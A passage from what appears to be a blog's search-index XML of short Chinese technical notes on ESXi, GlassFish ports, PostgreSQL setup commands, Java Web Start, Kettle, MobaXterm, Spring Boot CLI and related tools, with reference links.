<li><a href="https://blog.csdn.net/weixin_34043301/article/details/89756540" target="_blank" rel="noopener">linux的系统版本查看和开启的终端个数</a>,by weixin_34043301.</li>
<li><a href="https://www.cnblogs.com/kaishirenshi/p/13496475.html" target="_blank" rel="noopener">tcp与tcp6的区别</a>,by 开始认识.</li>
<li><a href="https://docs.nvidia.com/datacenter/tesla/tesla-installation-notes/index.html" target="_blank" rel="noopener">NVIDIA Driver Installation Quickstart Guide</a>,by nvidia.</li>
<li><a href="https://www.jianshu.com/p/55fa36123960" target="_blank" rel="noopener">Linux scp命令远程拷贝复制</a>,by 我只是一个小白木木.</li>
<li><a href="https://jerryshang.me/linux-file-creation-with-group/" target="_blank" rel="noopener">Linux 下创建文件时指定用户组</a>,by Jerry Shang.</li>
<li><a href="https://blog.csdn.net/jin970505/article/details/79068429" target="_blank" rel="noopener">setfacl命令的基本用法</a>,by yearing1017.</li>
<li><a href="https://github.com/clearlinux/distribution/issues/365" target="_blank" rel="noopener">/var/run/docker.sock socket is inconsistent with permissions (root:root | root:docker )</a>,by github.</li>
<li><a href="https://stackoverflow.com/questions/48568172/docker-sock-permission-denied" target="_blank" rel="noopener">docker.sock permission denied</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware_ESXi安装配置教程</title>
    <url>/2024/01/20/VMware-ESXi%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>公司购买了一台配置十分高级的联想工作站，为了充分利用该工作站，将安装 VMware_ESXi 对该工作站进行管理运维。</p>
<h1 id="VMware-ESXi简介"><a href="#VMware-ESXi简介" class="headerlink" title="VMware_ESXi简介"></a>VMware_ESXi简介</h1><p>VMware ESXi 是 VMware vSphere 虚拟化平台中的裸机虚拟机管理程序。作为用于创建和运行虚拟机 （VM） 的裸机虚拟机管理程序，VMware ESXi 在顶部运行并直接访问硬件，而无需安装操作系统。这种对硬件的直接访问使其比其他类型的虚拟机管理程序性能更好、运行速度更快、可扩展性更强。</p>
<p>VMWare ESXi 是 VMware 的裸机或 Type-1 虚拟机管理程序的名称。虚拟机监控程序是一种特殊的操作系统，您可以在其中创建、运行和管理多个虚拟机。每个 VM 都可以有自己的来宾操作系统和一个或多个应用程序。来宾操作系统可以是任何通用操作系统，如 Windows、macOS、Linux 等。</p>
<p>因此，单个 VMWare ESXi Server 可以同时支持多个 Windows 虚拟机或多个 Windows、macOS 和 Linux 虚拟机的组合。这称为服务器整合，这种做法允许您节省硬件、冷却和电源成本，并最大限度地利用物理资源。</p>
<p>作为 Type-1 虚拟机管理程序，VMWare ESXi Server 直接在物理基础架构上运行。因此，术语“裸机”。此特性与 Type-2 虚拟机监控程序不同，后者必须安装在操作系统之上。下图说明了两者之间的区别。</p>
<p align="center">
    <img src="images/Picture1.png" width="90%" alt="Type1 Vs Type2 虚拟机监控程序"/>
</p>
<center>图1 Type1 Vs Type2 虚拟机监控程序</center>

<p>由于 VMware ESXi 不在操作系统上运行，因此它可以直接访问 CPU、RAM、存储和网络等底层资源。因此，VMware ESXi 的性能比任何 Type 2 虚拟机管理程序都要好得多。因此，这些虚拟机上的虚拟机和应用程序的运行速度比在 Type 2 虚拟机监控程序上的运行速度要快得多。</p>
<h1 id="VMWare-ESXi安装配置"><a href="#VMWare-ESXi安装配置" class="headerlink" title="VMWare ESXi安装配置"></a>VMWare ESXi安装配置</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/q992316998/article/details/123614053" target="_blank" rel="noopener">VMware ESXI7.0的安装与配置（全过程超详细含中英文对照，附应知必会的理论基础和常见故障解决方案）</a></li>
</ul>
<h1 id="VMWare-ESXi安装问题"><a href="#VMWare-ESXi安装问题" class="headerlink" title="VMWare ESXi安装问题"></a>VMWare ESXi安装问题</h1><h2 id="VMWare-ESXi不识别网卡"><a href="#VMWare-ESXi不识别网卡" class="headerlink" title="VMWare ESXi不识别网卡"></a>VMWare ESXi不识别网卡</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/JENREY/article/details/105774542" target="_blank" rel="noopener">安装esxi时候的No Network Adapters报错 解决办法</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.parallels.com/blogs/ras/vmware-esxi/" target="_blank" rel="noopener">What Is the VMware ESXi Server and Its Role in the VMware Suite?</a>,by Alex Hunter.</li>
<li><a href="https://blog.csdn.net/q992316998/article/details/123614053" target="_blank" rel="noopener">VMware ESXI7.0的安装与配置（全过程超详细含中英文对照，附应知必会的理论基础和常见故障解决方案）</a>,by 某酷菌.</li>
<li><a href="https://blog.csdn.net/JENREY/article/details/105774542" target="_blank" rel="noopener">安装esxi时候的No Network Adapters报错 解决办法</a>,by Jenrey.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>GlassFish使用帮助</title>
    <url>/2024/01/20/GlassFish%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Glassfish是一款Web应用服务器，和Tomcat一样，也是一款优秀的Servlet容器。</p>
<h1 id="功能端口"><a href="#功能端口" class="headerlink" title="功能端口"></a>功能端口</h1><p>GlassFish 常见功能端口主要有：</p>
<table>
<thead>
<tr>
<th>端口名称</th>
<th>端口号</th>
</tr>
</thead>
<tbody><tr>
<td>Admin</td>
<td>4848</td>
</tr>
<tr>
<td>HTTP Instance</td>
<td>8080</td>
</tr>
<tr>
<td>JMS</td>
<td>7676</td>
</tr>
<tr>
<td>IIOP</td>
<td>3700</td>
</tr>
<tr>
<td>HTTP_SSL</td>
<td>8181</td>
</tr>
<tr>
<td>IIOP_SSL</td>
<td>3820</td>
</tr>
<tr>
<td>JMX_ADMIN</td>
<td>8686</td>
</tr>
</tbody></table>
<p>备注：JMS 即 Java 消息服务，是一种消息传递标准，它允许基于 Java 平台企业版 (Java EE) 的应用程序组件创建、发送、接收和读取消息。它支持松散耦合、可靠和异步的分布式通信。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/2096077" target="_blank" rel="noopener">GlassFish 总结</a>,by 全栈程序员站长.</li>
<li><a href="https://en.wikipedia.org/wiki/GlassFish" target="_blank" rel="noopener">GlassFish</a>,by wikipedia.</li>
<li><a href="https://juejin.cn/post/7172879586445754399" target="_blank" rel="noopener">深入浅出带你学习GlassFish中间件漏洞</a>,by XINO.</li>
<li><a href="https://www.cnblogs.com/WLCYSYS/p/15500654.html" target="_blank" rel="noopener">消息队列-OPEN MQ</a>,by 小树木.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Nodejs常用库简介</title>
    <url>/2024/01/21/Nodejs%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Nodejs常用库是每个Nodejs开发人员必须熟悉的工具。常用的Nodejs库主要有：</p>
<ul>
<li>Sequelize</li>
<li>Expressjs</li>
<li>CORS</li>
<li>Nodemailer</li>
<li>passport</li>
<li>Async</li>
<li>Winston</li>
<li>Mongoose</li>
<li>Socket.IO</li>
<li>Lodash</li>
<li>Axios</li>
<li>puppeteer</li>
<li>Multer</li>
<li>Dotenv</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.devgenius.io/13-heart-pounding-node-js-libraries-to-ignite-your-next-project-94ee989203b9" target="_blank" rel="noopener">Node.js Power Tools: 13 Libraries Every Developer Should Know</a>,by Pinjari Rehan.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL数据库学习笔记</title>
    <url>/2024/01/21/PostgreSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近公司决定使用 PostgreSQL 数据库，提前学习一下。</p>
<h1 id="PostgreSQL简介"><a href="#PostgreSQL简介" class="headerlink" title="PostgreSQL简介"></a>PostgreSQL简介</h1><p>PostgreSQL 是一个功能强大的开源对象关系数据库系统，它使用并扩展了 SQL 语言，并结合了许多功能，可以安全地存储和扩展最复杂的数据工作负载。PostgreSQL 的起源可以追溯到 1986 年，是加州大学伯克利分校 POSTGRES 项目的一部分，在核心平台上已经有超过 35 年的积极开发历史。</p>
<p>PostgreSQL 以其成熟的架构、可靠性、数据完整性、强大的功能集、可扩展性以及软件背后的开源社区的奉献精神而赢得了良好的声誉，以始终如一地提供高性能和创新的解决方案。PostgreSQL 可在所有主要操作系统上运行，自 2001 年以来一直符合 ACID 标准，并具有强大的附加组件，例如流行的 PostGIS 地理空间数据库扩展器。毫不奇怪，PostgreSQL已成为许多人和组织的首选开源关系数据库。</p>
<p>PostgreSQL 具有许多功能，旨在帮助开发人员构建应用程序、管理员保护数据完整性和构建容错环境，并帮助您管理数据，无论数据集有多大或多小。除了免费和开源之外，PostgreSQL 还具有高度可扩展性。例如，您可以定义自己的数据类型，构建自定义函数，甚至可以使用不同的编程语言编写代码，而无需重新编译数据库！</p>
<h1 id="PostgreSQL-功能简介"><a href="#PostgreSQL-功能简介" class="headerlink" title="PostgreSQL 功能简介"></a>PostgreSQL 功能简介</h1><h2 id="Data-Types-数据类型"><a href="#Data-Types-数据类型" class="headerlink" title="Data Types 数据类型"></a>Data Types 数据类型</h2><ul>
<li>Primitives: Integer, Numeric, String, Boolean<br>基元：整数、数字、字符串、布尔值</li>
<li>Structured: Date/Time, Array, Range / Multirange, UUID<br>结构化：日期/时间、数组、范围/多范围、UUID</li>
<li>Document: JSON/JSONB, XML, Key-value (Hstore)<br>文档：JSON/JSONB、XML、键值 （Hstore）</li>
<li>Geometry: Point, Line, Circle, Polygon<br>几何图形：点、线、圆、多边形</li>
<li>Customizations: Composite, Custom Types<br>自定义：复合、自定义类型</li>
</ul>
<h2 id="Data-Integrity-数据完整性"><a href="#Data-Integrity-数据完整性" class="headerlink" title="Data Integrity 数据完整性"></a>Data Integrity 数据完整性</h2><ul>
<li>UNIQUE, NOT NULL 唯一，不为 NULL</li>
<li>Primary Keys 主键</li>
<li>Foreign Keys 外键</li>
<li>Exclusion Constraints 排除约束</li>
<li>Explicit Locks, Advisory Locks<br>显式锁、咨询锁</li>
</ul>
<h2 id="Concurrency-Performance-并发性、性能"><a href="#Concurrency-Performance-并发性、性能" class="headerlink" title="Concurrency, Performance 并发性、性能"></a>Concurrency, Performance 并发性、性能</h2><ul>
<li>Indexing: B-tree, Multicolumn, Expressions, Partial<br>索引：B 树、多列、表达式、部分</li>
<li>Advanced Indexing: GiST, SP-Gist, KNN Gist, GIN, BRIN, * Covering indexes, Bloom filters<br>高级索引：GiST、SP-Gist、KNN Gist、GIN、BRIN、覆盖索引、布隆过滤器</li>
<li>Sophisticated query planner / optimizer, index-only scans, multicolumn statistics<br>复杂的查询计划器/优化器、仅索引扫描、多列统计信息</li>
<li>Transactions, Nested Transactions (via savepoints)<br>事务、嵌套事务（通过保存点）</li>
<li>Multi-Version concurrency Control (MVCC)<br>多版本并发控制 （MVCC）</li>
<li>Parallelization of read queries and building B-tree indexes<br>读取查询的并行化和构建 B 树索引</li>
<li>Table partitioning 表分区</li>
<li>All transaction isolation levels defined in the SQL standard, including Serializable<br>SQL 标准中定义的所有事务隔离级别，包括 Serializable</li>
<li>Just-in-time (JIT) compilation of expressions<br>表达式的实时 （JIT） 编译</li>
</ul>
<h1 id="PostgreSQL-安装配置"><a href="#PostgreSQL-安装配置" class="headerlink" title="PostgreSQL 安装配置"></a>PostgreSQL 安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>PostgreSQL安装过程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装PostgreSQL服务</span><br><span class="line">sudo yum install -y postgresql12 postgresql12-server</span><br><span class="line"></span><br><span class="line"># 初始化数据库</span><br><span class="line">sudo &#x2F;usr&#x2F;pgsql-12&#x2F;bin&#x2F;postgresql-12-setup initdb</span><br><span class="line"></span><br><span class="line"># 启动PostgreSQL服务</span><br><span class="line">sudo systemctl start postgresql-12</span><br><span class="line"></span><br><span class="line"># 设置PostgreSQL服务为开机启动</span><br><span class="line">sudo systemctl enable postgresql-12</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>PostgreSQL安装成功之后，会默认创建一个名为postgres的Linux用户，初始化数据库后，会有名为postgres的数据库，来存储数据库的基础信息，例如用户信息等等，相当于MySQL中默认的名为mysql数据库。</p>
<p>postgres数据库中会初始化一名超级用户postgres。为了方便我们使用postgres账号进行管理，我们可以修改该账号的密码。具体命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su postgres</span><br><span class="line"></span><br><span class="line"># 登录PostgreSQL数据库</span><br><span class="line">psql</span><br><span class="line">psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432</span><br><span class="line"></span><br><span class="line"># 为postgres用户设置新密码</span><br><span class="line">ALTER USER postgres WITH PASSWORD &#39;NewPassword&#39;;</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL-模式（SCHEMA）"><a href="#PostgreSQL-模式（SCHEMA）" class="headerlink" title="PostgreSQL 模式（SCHEMA）"></a>PostgreSQL 模式（SCHEMA）</h2><p>PostgreSQL 模式（SCHEMA）可以看着是一个表的集合。</p>
<p>一个模式可以包含视图、索引、数据类型、函数和操作符等。</p>
<p>相同的对象名称可以被用于不同的模式中而不会出现冲突，例如 schema1 和 myschema 都可以包含名为 mytable 的表。</p>
<p>使用模式的优势：</p>
<ul>
<li><p>允许多个用户使用一个数据库并且不会互相干扰。</p>
</li>
<li><p>将数据库对象组织成逻辑组以便更容易管理。</p>
</li>
<li><p>第三方应用的对象可以放在独立的模式中，这样它们就不会与其他对象的名称发生冲突。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE SCHEMA schema_name;</span><br><span class="line"># 切换到新创建的模式，以查询模式下的对象</span><br><span class="line">SET search_path TO schema_name;</span><br></pre></td></tr></table></figure>

<h2 id="数据库相关语法示例"><a href="#数据库相关语法示例" class="headerlink" title="数据库相关语法示例"></a>数据库相关语法示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建数据库</span><br><span class="line">CREATE DATABASE mydb;</span><br><span class="line"></span><br><span class="line"># 查看所有数据库</span><br><span class="line">\l</span><br><span class="line"></span><br><span class="line"># 切换当前数据库</span><br><span class="line">\c mydb</span><br><span class="line"></span><br><span class="line"># 创建表</span><br><span class="line">CREATE TABLE test(id int,body varchar(100));</span><br><span class="line"></span><br><span class="line"># 查看当前数据库下所有表</span><br><span class="line">\d</span><br><span class="line"></span><br><span class="line"># 列出某一张表格的结构</span><br><span class="line">\d [table_name]</span><br><span class="line"></span><br><span class="line"># 列出所有用户</span><br><span class="line">\du</span><br><span class="line"></span><br><span class="line"># 列出所有用户，包含额外列</span><br><span class="line">\du+</span><br><span class="line"></span><br><span class="line"># 打开文本编辑器</span><br><span class="line">\3</span><br><span class="line"></span><br><span class="line"># 列出当前数据库和连接的信息</span><br><span class="line">\conninfo</span><br><span class="line"></span><br><span class="line"># 退出</span><br><span class="line">\q</span><br><span class="line"></span><br><span class="line"># 查看SQL命令的解释，比如\h select。</span><br><span class="line">\h</span><br><span class="line"></span><br><span class="line"># 查看psql命令列表</span><br><span class="line">\?</span><br></pre></td></tr></table></figure>

<h2 id="用户与访问授权语法示例"><a href="#用户与访问授权语法示例" class="headerlink" title="用户与访问授权语法示例"></a>用户与访问授权语法示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#新建用户</span><br><span class="line">CREATE USER test WITH PASSWORD &#39;test&#39;;</span><br><span class="line"></span><br><span class="line">#赋予指定账户指定数据库所有权限</span><br><span class="line">GRANT ALL PRIVILEGES ON DATABASE mydb TO test;</span><br><span class="line"></span><br><span class="line">#移除指定账户指定数据库所有权限</span><br><span class="line">REVOKE ALL PRIVILEGES ON DATABASE mydb TO test</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.postgresql.org/about/" target="_blank" rel="noopener">About PostgreSQL</a>,by postgresql.</li>
<li><a href="https://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html" target="_blank" rel="noopener">PostgreSQL新手入门</a>,by ruanyifeng.</li>
<li><a href="https://ken.io/note/centos7-postgresql12-install-and-configuration" target="_blank" rel="noopener">在CentOS 7上安装&amp;配置PostgreSQL 12</a>,by 数据库.</li>
<li><a href="https://blog.csdn.net/qq_35995514/article/details/132049841" target="_blank" rel="noopener">【PostgreSQL】系列之 一 schema详解（二）</a>,by 阿龙先生啊.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Java_Web_Start技术入门教程</title>
    <url>/2024/01/21/Java-Web-Start%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>JavaTM Web Start 是基于 Java 技术的应用程序的一种部署解决方案。它是连接计算机和 Internet 的便捷通道，允许用户在完全脱离 Web 的情况下运行和管理应用程序。Java Web Start 提供一次单击激活应用程序的简易方法，并保证始终运行应用程序的最新版本，从而可避免复杂的安装或升级过程。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Java Web Start 技术是一种面向 Web 的应用程序部署解决方案。使用全功能应用程序替代基于 HTML 的客户软件具有多种好处：</p>
<ul>
<li>高度交互的用户界面，可与传统应用程序（如文字处理和电子表格软件）相媲美。</li>
<li>较低的带宽需求。应用程序无须在每次单击时都与 Web 服务器进行连接，它可以缓存已经下载的信息。这样，它可以在低速连接上实现更好的交互性。</li>
<li>支持脱机使用。</li>
</ul>
<p align="center">
    <img src="images/jws_model.gif" width="90%" alt="Java Web Start 启动客户机应用程序流程"/>
</p>
<center>图1  Java Web Start 启动客户机应用程序流程</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/allway2/article/details/126178773" target="_blank" rel="noopener">Java Web Start 指南</a>,by allway2.</li>
<li><a href="https://web.lemoyne.edu/courseinformation/MTH%20303/jre/javaws/Readme_zh_CN.html" target="_blank" rel="noopener">JavaTM Web Start 技术</a>,by lemoyne.</li>
<li><a href="https://www.ibm.com/docs/zh/was-zos/9.0.5?topic=start-java-web-architecture-deploying-application-clients" target="_blank" rel="noopener">用于部署应用程序客户机的 Java Web Start 体系结构</a>,by ibm.</li>
<li><a href="https://blog.csdn.net/weixin_62511863/article/details/124853952" target="_blank" rel="noopener">[Java进阶] Swing两万字大总结一（超详细教程，这不得收藏一波）</a>,by 程序喵正在路上.</li>
<li><a href="https://zh.wikipedia.org/wiki/Java_Servlet" target="_blank" rel="noopener">Java Servlet</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/topwqp/article/details/8595936" target="_blank" rel="noopener">java和 javaw 以及 javaws的区别</a>,by bird_cat.</li>
<li><a href="https://www.cnblogs.com/softidea/p/4860692.html" target="_blank" rel="noopener">JNLP（Java Web Start ）(转) </a>,by  沧海一滴.</li>
<li><a href="https://www.cnblogs.com/langdashu/p/6530898.html" target="_blank" rel="noopener">Tomcat Jboss Glassfish 三种常见web容器比较</a>,by langdashu.</li>
<li><a href="https://en.wikipedia.org/wiki/Java_Web_Start" target="_blank" rel="noopener">Java Web Start</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>kettle入门教程</title>
    <url>/2024/01/23/kettle%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Kettle 是一款国外开源的 ETL（Extract-Transform-Load的缩写，即数据抽取、转换、装载的过程）工具，纯java编写，可以在Window、Linux、Unix上运行，绿色无需安装，数据抽取高效稳定。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Kettle 中文名称叫水壶，该项目的主程序员MATT 希望把各种数据放到一个壶里，然后以一种指定的格式流出。</p>
<p>Kettle这个ETL工具集，它允许你管理来自不同数据库的数据，通过提供一个图形化的用户环境来描述你想做什么，而不是你想怎么做。</p>
<p>Kettle中有两种脚本文件，transformation和job，transformation完成针对数据的基础转换，job则完成整个工作流的控制。</p>
<p>Kettle(现在已经更名为PDI，Pentaho Data Integration-Pentaho数据集成)。</p>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Kettle的执行分为两个层次：Job（作业）和Transformation（转换）。</p>
<h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><ul>
<li><p>Spoon.bat/spoon.sh：是一个图形化界面，可以让我们用图形化的方式开发转换和作业。</p>
</li>
<li><p>Pan.bat/pan.sh：利用Pan可以用命令行的形式调用Trans。</p>
</li>
<li><p>Kitchen.bat/kitchen.sh：利用Kitchen可以使用命令行调用Job。</p>
</li>
<li><p>Carte.bat/Carte.sh：Carte是一个轻量级的Web容器，用于建立专用、远程的ETL Server。</p>
</li>
</ul>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="kettle连不上mysql数据库"><a href="#kettle连不上mysql数据库" class="headerlink" title="kettle连不上mysql数据库"></a>kettle连不上mysql数据库</h2><p>kettle 7.1在 win7 上能正常连接mysql数据库，复制到 Win10 上反而不能连接成功。最后发现原因是 Win10 的时间设置不对，改成正常时间就能连接成功。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/137383200" target="_blank" rel="noopener">kettle入门实战</a>,by Gavin.</li>
<li><a href="http://www.kettle.org.cn/2794.html" target="_blank" rel="noopener">kettle的基础概念入门、下载、安装、部署</a>,by Kettle中文网.</li>
<li><a href="https://blog.csdn.net/gdkyxy2013/article/details/117060627" target="_blank" rel="noopener">七十七、Kettle的简介与安装部署</a>,by 象在舞.</li>
<li><a href="https://blog.csdn.net/weixin_43407520/article/details/123593474" target="_blank" rel="noopener">Kettle下载与安装教程【保姆版】</a>,by 亭子下的李子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>MobaXterm终端远程访问工具入门</title>
    <url>/2024/01/24/MobaXterm%E7%BB%88%E7%AB%AF%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<blockquote>
<p>MobaXterm 是一个增强型的 Windows 终端。</p>
</blockquote>
<blockquote>
<p>其为 Windows 桌面提供所有重要的 远程网络工具（SSH、X11、RDP、VNC、FTP、MOSH…）</p>
</blockquote>
<blockquote>
<p>和 Unix 命令（bash、ls、cat、sed、grep、awk、rsync…）。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_44074697/article/details/118544904" target="_blank" rel="noopener">MobaXterm（终端工具）下载&amp;安装&amp;使用教程</a>,by 蜗牛也不慢…….</li>
<li><a href="https://zhuanlan.zhihu.com/p/56341917" target="_blank" rel="noopener">全能终端神器——MobaXterm</a>,by 程序员良许​.</li>
<li><a href="https://zhuanlan.zhihu.com/p/600033514" target="_blank" rel="noopener">比Xshell更全能，更好用的SSH客户端神器，MobaXterm</a>,by 大技术.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>技术写作的诀窍</title>
    <url>/2024/01/27/%E6%8A%80%E6%9C%AF%E5%86%99%E4%BD%9C%E7%9A%84%E8%AF%80%E7%AA%8D/</url>
    <content><![CDATA[<h1 id="什么是技术写作"><a href="#什么是技术写作" class="headerlink" title="什么是技术写作"></a>什么是技术写作</h1><blockquote>
<p>技术写作非常重要，产品的开发、推广、维护都需要它。</p>
</blockquote>
<h1 id="技术写作的关键"><a href="#技术写作的关键" class="headerlink" title="技术写作的关键"></a>技术写作的关键</h1><blockquote>
<p>技术写作的好坏，跟语文水平关系不大，更多是一个技巧问题。</p>
<p>因为技术写作的评价标准，不是艺术性，而是表达是否清楚明白。它不需要华丽的词藻、巧妙的比喻、深刻的感悟，只需要把问题说清楚。</p>
<p>把问题说清楚的关键，在于你的思想是否清楚。</p>
</blockquote>
<h1 id="技术写作的诀窍"><a href="#技术写作的诀窍" class="headerlink" title="技术写作的诀窍"></a>技术写作的诀窍</h1><blockquote>
<p>文章采用单线结构。</p>
<p>所谓”单线结构”（也称”线性结构”），指的是一篇文章只说一件事，按照线性顺序进行叙述，由浅入深、循序渐进、平铺直叙、层层递进。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.ruanyifeng.com/blog/2024/01/weekly-issue-288.html" target="_blank" rel="noopener">科技爱好者周刊（第 288 期）：技术写作的首要诀窍</a>, 阮一峰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring_Boot_CLI入门教程</title>
    <url>/2024/02/21/Spring-Boot-CLI%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Spring Boot CLI 是一个命令行工具，可用于从 start.spring.io 引导新项目或对密码进行编码。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>手动安装，参考以下链接，下载 spring-boot-cli-3.2.2-bin.zip ，并将 spring 可执行程序文件夹添加到系统 PATH 环境变量中。</p>
<ul>
<li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/getting-started.html#getting-started.installing.cli" target="_blank" rel="noopener">3.2. Installing the Spring Boot CLI</a></li>
</ul>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>安装 CLI 后，您可以通过在命令行中键入 spring 并按 Enter 来运行它。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ spring</span><br><span class="line">$ spring help init</span><br><span class="line">$ spring version</span><br><span class="line">$ spring init --dependencies&#x3D;web,data-jpa my-project</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/cli.html" target="_blank" rel="noopener">Spring Boot CLI</a>,by spring.</li>
<li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/getting-started.html#getting-started.installing.cli" target="_blank" rel="noopener">3.2. Installing the Spring Boot CLI</a>,by spring.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Web拦截的奇技淫巧</title>
    <url>/2024/02/24/Web%E6%8B%A6%E6%88%AA%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="Web拦截的作用"><a href="#Web拦截的作用" class="headerlink" title="Web拦截的作用"></a>Web拦截的作用</h1><blockquote>
<p>计算机科学领域的任何问题都可以通过增加一个中间层来解决。 —— Butler Lampson</p>
</blockquote>
<p>在没有系统的控制权，不掌握系统代码的情况下，通过“非常规”（拦截） 手段来增加中间层，满足一些自定义的需求。类似于软件设计模式中的装饰模式。</p>
<h1 id="Web拦截的方法"><a href="#Web拦截的方法" class="headerlink" title="Web拦截的方法"></a>Web拦截的方法</h1><p>请参考：</p>
<ul>
<li><a href="https://hughfenghen.github.io/posts/2023/12/23/web-spy/" target="_blank" rel="noopener">Web 终极拦截技巧（全是骚操作）</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://hughfenghen.github.io/posts/2023/12/23/web-spy/" target="_blank" rel="noopener">Web 终极拦截技巧（全是骚操作）</a>,by 风痕 · 術&amp;思.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>FTP大文件传输之哈希验证</title>
    <url>/2024/03/02/FTP%E5%A4%A7%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%B9%8B%E5%93%88%E5%B8%8C%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<p>最近使用Filezilla下载GB级别的压缩文件时，发现文件完整性验证失败，导致压缩包无法解压。下载大文件出问题的原因是什么呢？如何解决该问题呢？下面简单探讨一下。</p>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>根据数字通信系统的基本模型（如图1所示）可知，大文件传输失败的原因最有可能是信道存在干扰。</p>
<p align="center">
    <img src="images/communication.jpg" width="50%" alt="数字通信系统模型"/>
</p>
<center>图1  数字通信系统模型</center>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>目前采用的解决方案如下：</p>
<ol>
